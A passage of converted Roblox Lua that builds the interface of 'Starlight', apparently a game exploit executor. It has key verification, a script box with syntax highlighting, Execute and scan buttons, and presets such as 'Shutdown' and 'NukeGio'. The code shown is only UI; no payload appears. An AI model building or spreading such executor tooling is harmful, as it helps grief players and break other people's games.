Converted["_Logs1"].Size = UDim2.new(0, 42, 0, 42)
Converted["_Logs1"].Name = "Logs"
Converted["_Logs1"].Parent = Converted["_Sidebar"]

Converted["_UICorner24"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner24"].Parent = Converted["_Logs1"]

Converted["_UIStroke25"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke25"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke25"].Thickness = 1.5
Converted["_UIStroke25"].Parent = Converted["_Logs1"]

Converted["_ImageLabel9"].Image = "rbxassetid://103052477976081"
Converted["_ImageLabel9"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_ImageLabel9"].BackgroundTransparency = 1
Converted["_ImageLabel9"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ImageLabel9"].BorderSizePixel = 0
Converted["_ImageLabel9"].Interactable = false
Converted["_ImageLabel9"].Position = UDim2.new(0.0714285746, 0, 0.0714285746, 0)
Converted["_ImageLabel9"].Size = UDim2.new(0, 35, 0, 35)
Converted["_ImageLabel9"].Parent = Converted["_Logs1"]

Converted["_Line"].Image = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Converted["_Line"].ImageColor3 = Color3.fromRGB(67.00000360608101, 67.00000360608101, 67.00000360608101)
Converted["_Line"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Line"].BackgroundTransparency = 1
Converted["_Line"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Line"].BorderSizePixel = 0
Converted["_Line"].Interactable = false
Converted["_Line"].Position = UDim2.new(-0.919230759, 0, 0.615705311, 0)
Converted["_Line"].Rotation = 90
Converted["_Line"].Size = UDim2.new(0, 245, 0, 6)
Converted["_Line"].Name = "Line"
Converted["_Line"].Parent = Converted["_Sidebar"]

Converted["_Verify"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Verify"].BackgroundTransparency = 1
Converted["_Verify"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Verify"].BorderSizePixel = 0
Converted["_Verify"].Position = UDim2.new(0, 0, 0.21895425, 0)
Converted["_Verify"].Size = UDim2.new(0, 558, 0, 239)
Converted["_Verify"].Visible = false
Converted["_Verify"].Name = "Verify"
Converted["_Verify"].Parent = Converted["_Frame"]

Converted["_Verify1"].Font = Enum.Font.Ubuntu
Converted["_Verify1"].Text = "Starlight - Verification"
Converted["_Verify1"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Verify1"].TextScaled = true
Converted["_Verify1"].TextSize = 50
Converted["_Verify1"].TextStrokeTransparency = 0
Converted["_Verify1"].TextWrapped = true
Converted["_Verify1"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Verify1"].BackgroundTransparency = 1
Converted["_Verify1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Verify1"].BorderSizePixel = 0
Converted["_Verify1"].Position = UDim2.new(-0.000269954791, 0, 0.000507817604, 0)
Converted["_Verify1"].Size = UDim2.new(0, 558, 0, 41)
Converted["_Verify1"].Name = "Verify"
Converted["_Verify1"].Parent = Converted["_Verify"]

Converted["_Verify2"].Font = Enum.Font.Ubuntu
Converted["_Verify2"].Text = "To verify, go to https://starlightkey.netlify.app and get the key."
Converted["_Verify2"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Verify2"].TextScaled = true
Converted["_Verify2"].TextSize = 50
Converted["_Verify2"].TextStrokeTransparency = 0
Converted["_Verify2"].TextWrapped = true
Converted["_Verify2"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Verify2"].BackgroundTransparency = 1
Converted["_Verify2"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Verify2"].BorderSizePixel = 0
Converted["_Verify2"].Position = UDim2.new(0.0177772008, 0, 0.205528736, 0)
Converted["_Verify2"].Size = UDim2.new(0, 547, 0, 30)
Converted["_Verify2"].Name = "Verify"
Converted["_Verify2"].Parent = Converted["_Verify"]

Converted["_TextBox1"].ClearTextOnFocus = false
Converted["_TextBox1"].Font = Enum.Font.SourceSans
Converted["_TextBox1"].PlaceholderColor3 = Color3.fromRGB(178.00000458955765, 178.00000458955765, 178.00000458955765)
Converted["_TextBox1"].PlaceholderText = "key here"
Converted["_TextBox1"].Text = ""
Converted["_TextBox1"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_TextBox1"].TextScaled = true
Converted["_TextBox1"].TextSize = 14
Converted["_TextBox1"].TextWrapped = true
Converted["_TextBox1"].BackgroundColor3 = Color3.fromRGB(12.000000234693289, 12.000000234693289, 12.000000234693289)
Converted["_TextBox1"].BorderColor3 = Color3.fromRGB(255, 255, 255)
Converted["_TextBox1"].Position = UDim2.new(0.275985658, 0, 0.456066936, 0)
Converted["_TextBox1"].Size = UDim2.new(0, 250, 0, 50)
Converted["_TextBox1"].Parent = Converted["_Verify"]

Converted["_Btn"].Font = Enum.Font.SourceSans
Converted["_Btn"].Text = "Verify"
Converted["_Btn"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Btn"].TextScaled = true
Converted["_Btn"].TextSize = 14
Converted["_Btn"].TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Btn"].TextWrapped = true
Converted["_Btn"].AutoButtonColor = false
Converted["_Btn"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_Btn"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Btn"].BorderSizePixel = 0
Converted["_Btn"].Position = UDim2.new(0.275985897, 0, 0.713890433, 0)
Converted["_Btn"].Size = UDim2.new(0, 249, 0, 42)
Converted["_Btn"].Name = "Btn"
Converted["_Btn"].Parent = Converted["_Verify"]

Converted["_UICorner25"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner25"].Parent = Converted["_Btn"]

Converted["_UIStroke26"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke26"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke26"].Thickness = 1.5
Converted["_UIStroke26"].Parent = Converted["_Btn"]

Converted["_m"].Font = Enum.Font.SourceSans
Converted["_m"].Text = ""
Converted["_m"].TextColor3 = Color3.fromRGB(0, 0, 0)
Converted["_m"].TextSize = 14
Converted["_m"].AutoButtonColor = false
Converted["_m"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_m"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_m"].BorderSizePixel = 0
Converted["_m"].Position = UDim2.new(0.830647767, 0, 0.0629773885, 0)
Converted["_m"].Size = UDim2.new(0, 42, 0, 42)
Converted["_m"].Name = "m"
Converted["_m"].Parent = Converted["_Frame"]

Converted["_UICorner26"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner26"].Parent = Converted["_m"]

Converted["_UIStroke27"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke27"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke27"].Thickness = 1.5
Converted["_UIStroke27"].Parent = Converted["_m"]

Converted["_ImageLabel10"].Image = "rbxassetid://125716871945612"
Converted["_ImageLabel10"].ImageColor3 = Color3.fromRGB(144.00000661611557, 144.00000661611557, 144.00000661611557)
Converted["_ImageLabel10"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_ImageLabel10"].BackgroundTransparency = 1
Converted["_ImageLabel10"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ImageLabel10"].BorderSizePixel = 0
Converted["_ImageLabel10"].Interactable = false
Converted["_ImageLabel10"].Position = UDim2.new(0.0714285746, 0, 0.0714285746, 0)
Converted["_ImageLabel10"].Size = UDim2.new(0, 35, 0, 35)
Converted["_ImageLabel10"].Parent = Converted["_m"]

Converted["_bg"].Image = "rbxassetid://992001116"
Converted["_bg"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_bg"].BackgroundTransparency = 1
Converted["_bg"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_bg"].BorderSizePixel = 0
Converted["_bg"].Interactable = false
Converted["_bg"].Position = UDim2.new(0, 0, 4.32260308e-08, 0)
Converted["_bg"].Size = UDim2.new(0, 621, 0, 353)
Converted["_bg"].Visible = false
Converted["_bg"].ZIndex = -2
Converted["_bg"].Name = "bg"
Converted["_bg"].Parent = Converted["_Frame"]

Converted["_UICorner27"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner27"].Parent = Converted["_bg"]

Converted["_UIStroke28"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke28"].Color = Color3.fromRGB(89.00000229477882, 89.00000229477882, 89.00000229477882)
Converted["_UIStroke28"].Thickness = 0.699999988079071
Converted["_UIStroke28"].Parent = Converted["_bg"]

Converted["_Notification"].BackgroundColor3 = Color3.fromRGB(12.000000234693289, 12.000000234693289, 12.000000234693289)
Converted["_Notification"].BackgroundTransparency = 0.029999999329447746
Converted["_Notification"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Notification"].BorderSizePixel = 0
Converted["_Notification"].Position = UDim2.new(1.01288247, 0, 0, 0)
Converted["_Notification"].Size = UDim2.new(0, 217, 0, 135)
Converted["_Notification"].Visible = false
Converted["_Notification"].Name = "Notification"
Converted["_Notification"].Parent = Converted["_Frame"]

Converted["_UIStroke29"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke29"].Color = Color3.fromRGB(148.000006377697, 148.000006377697, 148.000006377697)
Converted["_UIStroke29"].Thickness = 0.699999988079071
Converted["_UIStroke29"].Parent = Converted["_Notification"]

Converted["_UICorner28"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner28"].Parent = Converted["_Notification"]

Converted["_Title"].Font = Enum.Font.Code
Converted["_Title"].Text = "starlight"
Converted["_Title"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Title"].TextSize = 20
Converted["_Title"].TextWrapped = true
Converted["_Title"].TextXAlignment = Enum.TextXAlignment.Right
Converted["_Title"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Title"].BackgroundTransparency = 1
Converted["_Title"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Title"].BorderSizePixel = 0
Converted["_Title"].Size = UDim2.new(0, 210, 0, 44)
Converted["_Title"].Name = "Title"
Converted["_Title"].Parent = Converted["_Notification"]

Converted["_Desc"].Font = Enum.Font.Code
Converted["_Desc"].Text = "Desc"
Converted["_Desc"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Desc"].TextSize = 17
Converted["_Desc"].TextWrapped = true
Converted["_Desc"].TextXAlignment = Enum.TextXAlignment.Right
Converted["_Desc"].TextYAlignment = Enum.TextYAlignment.Top
Converted["_Desc"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Desc"].BackgroundTransparency = 1
Converted["_Desc"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Desc"].BorderSizePixel = 0
Converted["_Desc"].Position = UDim2.new(0.0138248848, 0, 0.333333343, 0)
Converted["_Desc"].Size = UDim2.new(0, 210, 0, 82)
Converted["_Desc"].Name = "Desc"
Converted["_Desc"].Parent = Converted["_Notification"]

Converted["_str"].Image = "rbxassetid://72292814630226"
Converted["_str"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_str"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_str"].BorderSizePixel = 0
Converted["_str"].LayoutOrder = 1
Converted["_str"].Position = UDim2.new(0.845882356, 0, 0.173590511, 0)
Converted["_str"].Size = UDim2.new(0, 50, 0, 50)
Converted["_str"].Visible = false
Converted["_str"].Name = "str"
Converted["_str"].Parent = Converted["_Starlight"]

Converted["_UIStroke30"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke30"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke30"].Thickness = 3
Converted["_UIStroke30"].Parent = Converted["_str"]

Converted["_UICorner29"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner29"].Parent = Converted["_str"]

-- Fake Module Scripts:

local fake_module_scripts = {}


-- Fake Local Scripts:

local function OANEA_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Frame.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Frame1"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Parent.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Parent.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end
local function KKMF_fake_script() -- Fake Script: StarterGui.Starlight.Frame.c.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_c"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	local button = script.Parent
	local frame = button.Parent.Parent
	
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(22,22,22)
		button.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(16,16,16)
		button.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	button.MouseButton1Down:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(10,10,10)
		button.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	button.MouseButton1Up:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(16,16,16)
		button.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	button.MouseButton1Click:Connect(function()
		frame:Destroy()
	end)
end
local function QASF_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Framee.Clear.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Clear"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.ScrollingFrame.Frame.TextBox.Text = ""
	end)
end
local function VDVLDTM_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Framee.Execute.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Execute"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function KBLRU_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Framee.scan.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_scan"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function YZIA_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Framee.rsix.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_rsix"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function GUGA_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Framee.dc.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_dc"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Click:Connect(function()
		game.StarterGui:SetCore("SendNotification",{
			Title = "💫 starlight",
			Text = "discord server link copied",
			Duration = 12
		})
		setclipboard("https://discord.gg/sCwubxMJ9z")
	
	end)
end
local function AJLB_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Framee.ScrollingFrame.Frame.TextBox.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_TextBox"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.Font = Enum.Font.Code
end
local function GWBAQWF_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Framee.ScrollingFrame.Frame.TextBox.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_TextBox"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	
end
local function DTTILH_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Framee.ScrollingFrame.Frame.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Frame2"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	local container = script.Parent
	local codeBox = container:WaitForChild("TextBox")
	local highlighter = container:WaitForChild("TextLabel")
	
	-- Enable RichText
	highlighter.RichText = true
	
	local keywords = {
		-- Lua Core Keywords
		["and"] = true, ["or"] = true, ["not"] = true,
		["if"] = true, ["then"] = true, ["else"] = true, ["elseif"] = true, ["end"] = true,
		["for"] = true, ["in"] = true, ["do"] = true, ["while"] = true,
		["repeat"] = true, ["until"] = true,
		["function"] = true, ["local"] = true, ["return"] = true,
		["break"] = true, ["continue"] = true, ["goto"] = true,
	
		-- Constants
		["true"] = true, ["false"] = true, ["nil"] = true,
	
		-- Lua Built-ins
		["print"] = true, ["warn"] = true, ["error"] = true,
		["assert"] = true, ["pcall"] = true, ["xpcall"] = true,
		["type"] = true, ["select"] = true, ["unpack"] = true, ["next"] = true,
		["pairs"] = true, ["ipairs"] = true,
		["tonumber"] = true, ["tostring"] = true,
		["collectgarbage"] = true, ["rawget"] = true, ["rawset"] = true, ["rawequal"] = true,
		["setmetatable"] = true, ["getmetatable"] = true,
	
		-- Math & String Libs
		["math"] = true, ["math.abs"] = true, ["math.floor"] = true, ["math.ceil"] = true,
		["math.random"] = true, ["math.pi"] = true, ["math.min"] = true, ["math.max"] = true,
		["string"] = true, ["string.len"] = true, ["string.sub"] = true, ["string.find"] = true,
		["string.match"] = true, ["string.format"] = true, ["string.gsub"] = true,
	
		-- Tables
		["table"] = true, ["table.insert"] = true, ["table.remove"] = true,
		["table.sort"] = true, ["table.concat"] = true, ["table.create"] = true,
	
		-- Roblox Specific
		["Instance.new"] = true,
		["require"] = true,
		["workspace"] = true, ["game"] = true, ["script"] = true, ["getfenv"] = true,
		["setfenv"] = true, ["loadstring"] = true, ["coroutine"] = true,
		["Instance"] = true, ["Vector3"] = true, ["CFrame"] = true, ["UDim2"] = true,
		["Enum"] = true, ["Color3"] = true, ["BrickColor"] = true,
		["wait"] = true,
		["task"] = true, ["spawn"] = true, ["delay"] = true, ["tick"] = true, ["time"] = true,
		["UserInputService"] = true, ["RunService"] = true, ["TweenService"] = true,
		["SoundService"] = true, ["Lighting"] = true, ["Players"] = true, ["ReplicatedStorage"] = true,
	}
	
	
	
	local function highlight(text)
		-- Escape richtext-breaking characters
		text = text:gsub("&", "&amp;"):gsub("<", "&lt;"):gsub(">", "&gt;")
	
		-- Store matches we don't want to double-color
		local protected = {}
	
		local function protect(str)
			table.insert(protected, str)
			return "\1PROTECT" .. #protected .. "\2"
		end
	
	
		-- Comments first (protect entire line after --)
		text = text:gsub("(%-%-.-)\n", function(c) return protect('<font color="#6a9955">'..c..'</font>').."\n" end)
		text = text:gsub("(%-%-.*)$", function(c) return protect('<font color="#6a9955">'..c..'</font>') end)
	
		-- Strings (single and double quoted)
		text = text:gsub('(".-")', function(s) return protect('<font color="#ce9178">'..s..'</font>') end)
		text = text:gsub("('.-')", function(s) return protect('<font color="#ce9178">'..s..'</font>') end)
	
		-- Keywords
		text = text:gsub("(%w+)", function(word)
			if keywords[word] then
				return '<font color="#569cd6">' .. word .. '</font>'
			end
			return word
		end)
	
		text = text:gsub("\1PROTECT(%d+)\2", function(i)
			return protected[tonumber(i)]
		end)
	
		return text
	end
	
	-- Sync text + resizing
	local function update()
		local rawText = codeBox.Text
		highlighter.Text = highlight(rawText)
	
		-- Optional: auto-resize based on lines
		local lines = select(2, rawText:gsub("\n", "\n")) + 1
		local lineHeight = codeBox.TextSize + 4
		local newHeight = lines * lineHeight
		container.Size = UDim2.new(1, 0, 0, newHeight)
	end
	
	-- Connect typing event
	codeBox:GetPropertyChangedSignal("Text"):Connect(update)
	
	-- Initial highlight
	codeBox.Text = "-- starlight"
	update()
end
local function EFZHJXR_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Presets.ScrollingFrame.CFour.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_CFour"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function ZEKZH_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Presets.ScrollingFrame.Shutdown.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Shutdown"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function JKMQNVT_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Presets.ScrollingFrame.Grab.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Grab"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function URTEXBY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Presets.ScrollingFrame.Sledge.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Sledge"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function KTBMNUU_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Presets.ScrollingFrame.NukeGio.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_NukeGio"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
